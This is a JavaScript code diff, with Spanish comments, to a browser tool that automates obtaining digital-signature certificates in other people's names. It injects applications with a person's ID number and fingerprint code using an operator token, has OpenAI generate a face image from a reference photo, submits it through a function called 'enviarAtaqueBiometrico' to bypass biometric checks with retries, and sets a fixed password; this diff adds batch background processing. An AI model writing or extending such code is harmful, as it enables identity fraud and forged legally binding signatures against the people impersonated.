@@ -458,11 +458,11 @@ document.addEventListener('paste', (e) => {
   }
 });
 
-// Función reutilizable para inyectar trámite de firma
-async function ejecutarInyeccionFirma() {
+// Función reutilizable para inyectar trámite de firma (soporta ejecución directa o desacoplada con snapshot)
+async function ejecutarInyeccionFirma(datosOverride = null, tokenOverride = null) {
   addLog('info', 'Iniciando proceso de inyección de trámite...');
 
-  let token = xTokenInput ? xTokenInput.value.trim() : '';
+  let token = tokenOverride || (xTokenInput ? xTokenInput.value.trim() : '');
   if (!token) {
     addLog('info', 'Token de operador vacío. Intentando renovar automáticamente...');
     await renovarToken();
@@ -489,30 +489,31 @@ async function ejecutarInyeccionFirma() {
     addLog('warn', 'El x-token ingresado no parece ser un JWT válido o no se pudo decodificar. Se enviará sin validar.');
   }
 
+  const p = datosOverride || {};
   const payload = {
-    apellidos: apellidosInput.value.trim(),
+    apellidos: p.apellidos !== undefined ? p.apellidos : (apellidosInput ? apellidosInput.value.trim() : ''),
     api_regla_codigo: "PN_BIOMETRIA_CEDULA",
     appointmentExpirationDate: "",
     archivo_aceptacion: "",
     archivo_constitucion: "",
     archivo_nombramiento: "",
     archivo_ruc: "",
-    banco: bancoInput.value.trim(),
+    banco: p.banco !== undefined ? p.banco : (bancoInput ? bancoInput.value.trim() : 'Banco Pichincha'),
     cargo: "",
-    cedula: cedulaInput.value.trim(),
-    celular: celularInput.value.trim(),
-    ciudad: ciudadInput.value.trim(),
+    cedula: p.cedula !== undefined ? p.cedula : (cedulaInput ? cedulaInput.value.trim() : ''),
+    celular: p.celular !== undefined ? p.celular : (celularInput ? celularInput.value.trim() : '0989410060'),
+    ciudad: p.ciudad !== undefined ? p.ciudad : (ciudadInput ? ciudadInput.value.trim() : ''),
     clavefirma: "",
     codUnico: "",
-    codUserT: codUserTInput.value.trim(),
-    codigo_dactilar: codigoDactilarInput.value.trim(),
+    codUserT: p.codUserT !== undefined ? p.codUserT : (codUserTInput ? codUserTInput.value.trim() : '8998419'),
+    codigo_dactilar: p.codigo_dactilar !== undefined ? p.codigo_dactilar : (codigoDactilarInput ? codigoDactilarInput.value.trim() : ''),
     comentario: "",
-    correo: correoInput.value.trim(),
-    direccion: direccionInput.value.trim(),
+    correo: p.correo !== undefined ? p.correo : (correoInput ? correoInput.value.trim() : 'm17800305@gmail.com'),
+    direccion: p.direccion !== undefined ? p.direccion : (direccionInput ? direccionInput.value.trim() : ''),
     edad: 32,
     emisor: "Enext",
     foto_frontal: "",
-    foto_pago: fotoPagoBase64 || DEFAULT_FOTO_PAGO,
+    foto_pago: p.foto_pago || (fotoPagoBase64 || DEFAULT_FOTO_PAGO),
     foto_posterior: "",
     foto_selfie: "",
     funcionJudicial: false,
@@ -520,28 +521,28 @@ async function ejecutarInyeccionFirma() {
     minetype_aceptacion: "",
     minetype_constitucion: "",
     minetype_foto_frontal: "",
-    minetype_foto_pago: fotoPagoMimetype || "image/jpeg",
+    minetype_foto_pago: p.minetype_foto_pago || (fotoPagoMimetype || "image/jpeg"),
     minetype_foto_posterior: "",
     minetype_foto_selfie: "",
     minetype_nombramiento: "",
     minetype_ruc: "",
     minetype_video: "",
-    nombres: nombresInput.value.trim(),
+    nombres: p.nombres !== undefined ? p.nombres : (nombresInput ? nombresInput.value.trim() : ''),
     notificarEmisionDuplicado: true,
-    numero_tramite: numeroTramiteInput.value.trim(),
-    parroquia: parroquiaInput.value.trim(),
-    perfil_firma: perfilFirmaInput.value.trim(),
+    numero_tramite: p.numero_tramite !== undefined ? p.numero_tramite : (numeroTramiteInput ? numeroTramiteInput.value.trim() : '12345'),
+    parroquia: p.parroquia !== undefined ? p.parroquia : (parroquiaInput ? parroquiaInput.value.trim() : ''),
+    perfil_firma: p.perfil_firma !== undefined ? p.perfil_firma : (perfilFirmaInput ? perfilFirmaInput.value.trim() : '021'),
     promocion: "No Aplica",
     proveedor_configurado: "Enext",
-    provincia: provinciaInput.value.trim(),
-    ptoEmision: ptoEmisionInput.value.trim(),
+    provincia: p.provincia !== undefined ? p.provincia : (provinciaInput ? provinciaInput.value.trim() : ''),
+    ptoEmision: p.ptoEmision !== undefined ? p.ptoEmision : (ptoEmisionInput ? ptoEmisionInput.value.trim() : '999'),
     recurrencia: "",
-    ruc: rucInput.value.trim(),
+    ruc: p.ruc !== undefined ? p.ruc : (rucInput ? rucInput.value.trim() : ''),
     tipoPersona: "natural",
     tipo_clave: 0,
     tipo_documento: "CEDULA",
     tipo_tramitacion: "Biometria",
-    valorPago: valorPagoInput.value.trim(),
+    valorPago: p.valorPago !== undefined ? p.valorPago : (valorPagoInput ? valorPagoInput.value.trim() : '5'),
     video: ""
   };
 
@@ -1651,7 +1652,7 @@ async function ejecutarInyeccionCompleta() {
   // Registrar solicitud en el panel de la derecha
   const idSolicitud = registrarNuevaSolicitud({
     estado: 'En Proceso',
-    estadoDetalle: 'Paso 1/3: Inyectando Solicitud POST...',
+    estadoDetalle: 'Paso 1/3: Solicitud enviada, iniciando en segundo plano...',
     cedula: datosPostSnapshot.cedula,
     nombres: datosPostSnapshot.nombres,
     apellidos: datosPostSnapshot.apellidos,
@@ -1661,98 +1662,203 @@ async function ejecutarInyeccionCompleta() {
     clave: 'Roxana22'
   });
 
-  if (inyeccionCompletaBtn) {
-    inyeccionCompletaBtn.classList.add('loading');
-    inyeccionCompletaBtn.disabled = true;
+  // Mostrar aviso de éxito inmediatamente con los dos botones (Esperar e Ingresar otro trámite)
+  const avisoExitoCompleto = document.getElementById('avisoExitoCompleto');
+  if (avisoExitoCompleto) {
+    avisoExitoCompleto.style.display = 'block';
+    avisoExitoCompleto.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
   }
-  if (injectBtn) injectBtn.disabled = true;
+
+  addLog('success', `[INYECCIÓN COMPLETA] Solicitud registrada con éxito para ${datosPostSnapshot.nombres} ${datosPostSnapshot.apellidos} (Cédula: ${datosPostSnapshot.cedula}).`);
+  addLog('info', '[INYECCIÓN COMPLETA] El trámite se procesará en segundo plano. Puedes esperar o ingresar otro trámite de inmediato.');
+
+  // Iniciar procesamiento en segundo plano de forma desacoplada
+  procesarTramiteEnSegundoPlano(idSolicitud);
+}
+
+// Conjunto para evitar procesar la misma solicitud dos veces en paralelo
+const solicitudesEnEjecucion = new Set();
+
+// Procesador autónomo en segundo plano (no depende de los valores actuales del DOM)
+async function procesarTramiteEnSegundoPlano(idSolicitud) {
+  if (solicitudesEnEjecucion.has(idSolicitud)) {
+    return;
+  }
+  solicitudesEnEjecucion.add(idSolicitud);
 
   try {
-    // ----------------------------------------------------
-    // PASO 1: Inyectar Solicitud POST
-    // ----------------------------------------------------
-    addLog('info', `[INYECCIÓN COMPLETA] ========================================`);
-    addLog('info', `[INYECCIÓN COMPLETA] PASO 1/3: Inyectando Solicitud POST de Trámite...`);
-    addLog('info', `[INYECCIÓN COMPLETA] ========================================`);
-    actualizarTextoInyeccionCompletaBtn('Paso 1/3: Inyectando Trámite...');
-
-    const resInyeccion = await ejecutarInyeccionFirma();
-    if (!resInyeccion.ok || !resInyeccion.link_biometria) {
-      actualizarEstadoSolicitud(idSolicitud, 'Rechazada', resInyeccion.error || 'La inyección del trámite falló.');
-      throw new Error(resInyeccion.error || 'La inyección del trámite falló.');
+    const solicitudes = obtenerSolicitudesHistorial();
+    const sol = solicitudes.find(s => s.id === idSolicitud);
+    if (!sol) {
+      solicitudesEnEjecucion.delete(idSolicitud);
+      return;
     }
 
-    const token = resInyeccion.token || extraerTokenDeUrl(resInyeccion.link_biometria);
+    if (sol.estado === 'Aprobada' || sol.estado === 'Rechazada') {
+      solicitudesEnEjecucion.delete(idSolicitud);
+      return;
+    }
+
+    const cedula = sol.cedula || 'Trámite';
+    const clave = sol.clave || 'Roxana22';
+    let token = sol.token || '';
+    let linkBiometria = sol.linkBiometria || '';
+
+    // ----------------------------------------------------
+    // PASO 1: Inyectar Solicitud POST (si no tiene token previo)
+    // ----------------------------------------------------
     if (!token) {
-      actualizarEstadoSolicitud(idSolicitud, 'Rechazada', 'No se pudo obtener el token de validación del enlace.');
-      throw new Error('No se pudo obtener el token de validación del enlace.');
-    }
+      addLog('info', `[SEGUNDO PLANO - ${cedula}] ========================================`);
+      addLog('info', `[SEGUNDO PLANO - ${cedula}] PASO 1/3: Inyectando Solicitud POST de Trámite...`);
+      addLog('info', `[SEGUNDO PLANO - ${cedula}] ========================================`);
+      actualizarEstadoSolicitud(idSolicitud, 'En Proceso', 'Paso 1/3: Inyectando Solicitud POST...');
 
-    actualizarEstadoSolicitud(idSolicitud, 'En Proceso', 'Paso 2/3: Generando foto y validando biometría...', {
-      token: token,
-      linkBiometria: resInyeccion.link_biometria
-    });
+      const resInyeccion = await ejecutarInyeccionFirma(sol.datosPost);
+      if (!resInyeccion.ok || !resInyeccion.link_biometria) {
+        const errorMsg = resInyeccion.error || 'La inyección del trámite falló.';
+        addLog('error', `[SEGUNDO PLANO - ${cedula}] ${errorMsg}`);
+        actualizarEstadoSolicitud(idSolicitud, 'Rechazada', errorMsg);
+        solicitudesEnEjecucion.delete(idSolicitud);
+        return;
+      }
+
+      linkBiometria = resInyeccion.link_biometria;
+      token = resInyeccion.token || extraerTokenDeUrl(linkBiometria);
+      if (!token) {
+        const errorMsg = 'No se pudo obtener el token de validación del enlace generado.';
+        addLog('error', `[SEGUNDO PLANO - ${cedula}] ${errorMsg}`);
+        actualizarEstadoSolicitud(idSolicitud, 'Rechazada', errorMsg);
+        solicitudesEnEjecucion.delete(idSolicitud);
+        return;
+      }
+
+      actualizarEstadoSolicitud(idSolicitud, 'En Proceso', 'Paso 2/3: Trámite inyectado, iniciando biometría...', {
+        token,
+        linkBiometria
+      });
+    }
 
     // ----------------------------------------------------
     // PASO 2: Generar Foto, Post-procesar y Validar Biometría
     // ----------------------------------------------------
-    addLog('info', `[INYECCIÓN COMPLETA] ========================================`);
-    addLog('info', `[INYECCIÓN COMPLETA] PASO 2/3: Generando Foto y Validando Biometría (hasta 5 intentos)...`);
-    addLog('info', `[INYECCIÓN COMPLETA] ========================================`);
-    actualizarTextoInyeccionCompletaBtn('Paso 2/3: Generando y Validando...');
-
-    const aprobado = await iniciarFlujoGenerarYValidar();
-    if (!aprobado) {
-      actualizarEstadoSolicitud(idSolicitud, 'Rechazada', 'Validación biométrica rechazada tras los intentos máximos.');
-      throw new Error('La validación biométrica no fue aprobada tras los intentos permitidos.');
+    const fotoBase = sol.fotoPersona;
+    if (!fotoBase || fotoBase.length < 50) {
+      const errorMsg = 'No se encontró foto de referencia para generar biometría.';
+      addLog('error', `[SEGUNDO PLANO - ${cedula}] ${errorMsg}`);
+      actualizarEstadoSolicitud(idSolicitud, 'Rechazada', errorMsg);
+      solicitudesEnEjecucion.delete(idSolicitud);
+      return;
     }
 
-    actualizarEstadoSolicitud(idSolicitud, 'En Proceso', 'Paso 3/3: Guardando contraseña...');
+    const maxIntentos = 5;
+    let bypassAprobado = false;
+
+    for (let intento = 1; intento <= maxIntentos; intento++) {
+      addLog('info', `[SEGUNDO PLANO - ${cedula}] ========================================`);
+      addLog('info', `[SEGUNDO PLANO - ${cedula}] PASO 2/3: Intento ${intento} de ${maxIntentos} - Generando Foto con IA...`);
+      addLog('info', `[SEGUNDO PLANO - ${cedula}] ========================================`);
+      actualizarEstadoSolicitud(idSolicitud, 'En Proceso', `Paso 2/3: Intento ${intento}/${maxIntentos} - Generando foto con IA...`);
+
+      let generatedImageUrl = null;
+
+      try {
+        const imagenOptimizada = await optimizarImagenParaIA(fotoBase, 1024, 0.85);
+        addLog('info', `[SEGUNDO PLANO - ${cedula}] Imagen optimizada (${Math.round(imagenOptimizada.length / 1024)} KB). Solicitando a OpenAI...`);
+
+        const response = await fetch(SUPABASE_PROXY_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'apikey': SUPABASE_ANON_KEY,
+            'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
+          },
+          body: JSON.stringify({
+            action: 'generate-ai',
+            prompt: DEFAULT_AI_PROMPT,
+            imageBase64: imagenOptimizada
+          })
+        });
+
+        const data = await response.json();
+        if (data.error) {
+          throw new Error(data.error.message || JSON.stringify(data.error));
+        }
+
+        if (data.data && data.data[0]) {
+          if (data.data[0].b64_json) {
+            generatedImageUrl = `data:image/jpeg;base64,${data.data[0].b64_json}`;
+          } else if (data.data[0].url) {
+            generatedImageUrl = data.data[0].url;
+          }
+        }
+
+        if (!generatedImageUrl) {
+          throw new Error('No se recibió la imagen de OpenAI.');
+        }
+
+        addLog('info', `[SEGUNDO PLANO - ${cedula}] Foto generada. Procesando y preparando validación...`);
+        actualizarEstadoSolicitud(idSolicitud, 'En Proceso', `Paso 2/3: Intento ${intento}/${maxIntentos} - Procesando imagen...`);
+
+        // Pausa de procesamiento en segundo plano (12 segundos)
+        await new Promise(r => setTimeout(r, 12000));
+
+        addLog('info', `[SEGUNDO PLANO - ${cedula}] Enviando prueba biométrica al servidor...`);
+        actualizarEstadoSolicitud(idSolicitud, 'En Proceso', `Paso 2/3: Intento ${intento}/${maxIntentos} - Validando en servidor...`);
+
+        const resultado = await enviarAtaqueBiometrico(generatedImageUrl, token);
+
+        if (resultado.ok) {
+          bypassAprobado = true;
+          addLog('success', `[SEGUNDO PLANO - ${cedula}] ¡Validación biométrica APROBADA en el intento ${intento}!`);
+          break;
+        } else {
+          addLog('warn', `[SEGUNDO PLANO - ${cedula}] Intento ${intento} rechazado por el servidor (${resultado.body ? resultado.body.trim() : '0'}).`);
+          if (intento < maxIntentos) {
+            addLog('info', `[SEGUNDO PLANO - ${cedula}] Reintentando generación en 3 segundos (${intento + 1} de ${maxIntentos})...`);
+            await new Promise(r => setTimeout(r, 3000));
+          }
+        }
+      } catch (errIntento) {
+        addLog('error', `[SEGUNDO PLANO - ${cedula}] Error en intento ${intento}: ${errIntento.message}`);
+        if (intento < maxIntentos) {
+          await new Promise(r => setTimeout(r, 3000));
+        }
+      }
+    }
+
+    if (!bypassAprobado) {
+      const errorMsg = 'Validación biométrica rechazada tras los intentos máximos permitidos.';
+      addLog('error', `[SEGUNDO PLANO - ${cedula}] ${errorMsg}`);
+      actualizarEstadoSolicitud(idSolicitud, 'Rechazada', errorMsg);
+      solicitudesEnEjecucion.delete(idSolicitud);
+      return;
+    }
 
     // ----------------------------------------------------
-    // PASO 3: Guardar Contraseña Fija Roxana22
+    // PASO 3: Guardar Contraseña Fija
     // ----------------------------------------------------
-    addLog('info', `[INYECCIÓN COMPLETA] ========================================`);
-    addLog('info', `[INYECCIÓN COMPLETA] PASO 3/3: Guardando Contraseña en Servidor...`);
-    addLog('info', `[INYECCIÓN COMPLETA] ========================================`);
-    actualizarTextoInyeccionCompletaBtn('Paso 3/3: Guardando Contraseña...');
+    addLog('info', `[SEGUNDO PLANO - ${cedula}] ========================================`);
+    addLog('info', `[SEGUNDO PLANO - ${cedula}] PASO 3/3: Guardando Contraseña "${clave}" en Servidor...`);
+    addLog('info', `[SEGUNDO PLANO - ${cedula}] ========================================`);
+    actualizarEstadoSolicitud(idSolicitud, 'En Proceso', `Paso 3/3: Guardando contraseña ${clave}...`);
 
-    const pass = (newPassInput && newPassInput.value.trim()) ? newPassInput.value.trim() : 'Roxana22';
-    const resPass = await guardarContrasenaEnServidor(token, pass);
+    const resPass = await guardarContrasenaEnServidor(token, clave);
 
     if (resPass.ok) {
-      addLog('success', `[INYECCIÓN COMPLETA - FINALIZADO] ¡TODO EL PROCESO FUE COMPLETADO CON ÉXITO!`);
-      addLog('success', `Trámite creado -> Biometría aprobada -> Contraseña "${pass}" guardada.`);
-      actualizarTextoInyeccionCompletaBtn('¡Inyección Completa Exitosa!');
-
+      addLog('success', `[SEGUNDO PLANO - ${cedula}] ¡TRÁMITE COMPLETADO Y APROBADO CON ÉXITO!`);
+      addLog('success', `[SEGUNDO PLANO - ${cedula}] Trámite creado -> Biometría aprobada -> Contraseña "${clave}" guardada.`);
       actualizarEstadoSolicitud(idSolicitud, 'Aprobada', 'Trámite inyectado, biometría validada y contraseña guardada con éxito.');
-
-      const passwordSection = document.getElementById('passwordSection');
-      if (passwordSection) passwordSection.style.display = 'block';
-
-      const nuevaFirmaBtn = document.getElementById('nuevaFirmaBtn');
-      if (nuevaFirmaBtn) nuevaFirmaBtn.style.display = 'block';
-
-      // Mostrar aviso de éxito
-      const avisoExitoCompleto = document.getElementById('avisoExitoCompleto');
-      if (avisoExitoCompleto) {
-        avisoExitoCompleto.style.display = 'block';
-        avisoExitoCompleto.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-      }
     } else {
-      actualizarEstadoSolicitud(idSolicitud, 'Rechazada', 'Biometría aprobada pero falló al guardar contraseña.');
-      throw new Error('La validación biométrica pasó pero ocurrió un fallo al guardar la contraseña.');
+      const errorMsg = 'Biometría aprobada pero ocurrió un fallo al guardar la contraseña.';
+      addLog('error', `[SEGUNDO PLANO - ${cedula}] ${errorMsg}`);
+      actualizarEstadoSolicitud(idSolicitud, 'Rechazada', errorMsg);
     }
 
-  } catch (err) {
-    addLog('error', `[INYECCIÓN COMPLETA - ERROR] ${err.message}`);
-    actualizarTextoInyeccionCompletaBtn('INYECCION COMPLETA');
+  } catch (errGlobal) {
+    addLog('error', `[SEGUNDO PLANO] Error crítico en trámite: ${errGlobal.message}`);
+    actualizarEstadoSolicitud(idSolicitud, 'Rechazada', errGlobal.message || 'Error en segundo plano.');
   } finally {
-    if (inyeccionCompletaBtn) {
-      inyeccionCompletaBtn.classList.remove('loading');
-      inyeccionCompletaBtn.disabled = false;
-    }
-    if (injectBtn) injectBtn.disabled = false;
+    solicitudesEnEjecucion.delete(idSolicitud);
   }
 }
 
@@ -1760,13 +1866,24 @@ if (inyeccionCompletaBtn) {
   inyeccionCompletaBtn.addEventListener('click', ejecutarInyeccionCompleta);
 }
 
-// Botón "Generar Nueva Solicitud" dentro del aviso de éxito
+// Botón "Esperar" dentro del aviso de éxito
+const btnEsperarSolicitud = document.getElementById('btnEsperarSolicitud');
+if (btnEsperarSolicitud) {
+  btnEsperarSolicitud.addEventListener('click', () => {
+    const aviso = document.getElementById('avisoExitoCompleto');
+    if (aviso) aviso.style.display = 'none';
+    addLog('system', 'Permaneciendo en la página para visualizar logs del trámite enviado...');
+  });
+}
+
+// Botón "Ingresar otro trámite" dentro del aviso de éxito
 const btnGenerarNuevaSolicitud = document.getElementById('btnGenerarNuevaSolicitud');
 if (btnGenerarNuevaSolicitud) {
   btnGenerarNuevaSolicitud.addEventListener('click', () => {
     const aviso = document.getElementById('avisoExitoCompleto');
     if (aviso) aviso.style.display = 'none';
     reiniciarTodoParaNuevaFirma();
+    addLog('system', 'Formulario limpiado. Listo para ingresar otro trámite. Los trámites anteriores continúan procesándose en segundo plano.');
   });
 }
 
@@ -2350,8 +2467,32 @@ if (limpiarHistorialBtn) {
   });
 }
 
-// Renderizar historial al cargar y sincronizar con Supabase
-window.addEventListener('DOMContentLoaded', () => {
+// Función para reanudar solicitudes en segundo plano tras recarga o reinicio de página
+function verificarYReanudarSolicitudesEnProceso() {
+  const solicitudes = obtenerSolicitudesHistorial();
+  const ahora = Date.now();
+  const limiteTiempoMs = 20 * 60 * 1000; // 20 minutos de tolerancia
+
+  const pendientes = solicitudes.filter(s => s.estado === 'En Proceso');
+  if (pendientes.length === 0) return;
+
+  pendientes.forEach(sol => {
+    const edadMs = ahora - (sol.timestamp || ahora);
+    if (edadMs < limiteTiempoMs) {
+      if (!solicitudesEnEjecucion.has(sol.id)) {
+        addLog('system', `[SEGUNDO PLANO] Reanudando procesamiento en segundo plano del trámite: ${sol.nombreCompleto} (${sol.cedula})...`);
+        procesarTramiteEnSegundoPlano(sol.id);
+      }
+    } else {
+      actualizarEstadoSolicitud(sol.id, 'Rechazada', 'Tiempo de procesamiento expirado tras reinicio de página.');
+    }
+  });
+}
+
+// Renderizar historial al cargar, sincronizar con Supabase y reanudar tareas en segundo plano
+window.addEventListener('DOMContentLoaded', async () => {
   renderizarListaSolicitudes();
-  cargarHistorialDesdeSupabase();
+  verificarYReanudarSolicitudesEnProceso();
+  await cargarHistorialDesdeSupabase();
+  verificarYReanudarSolicitudesEnProceso();
 });
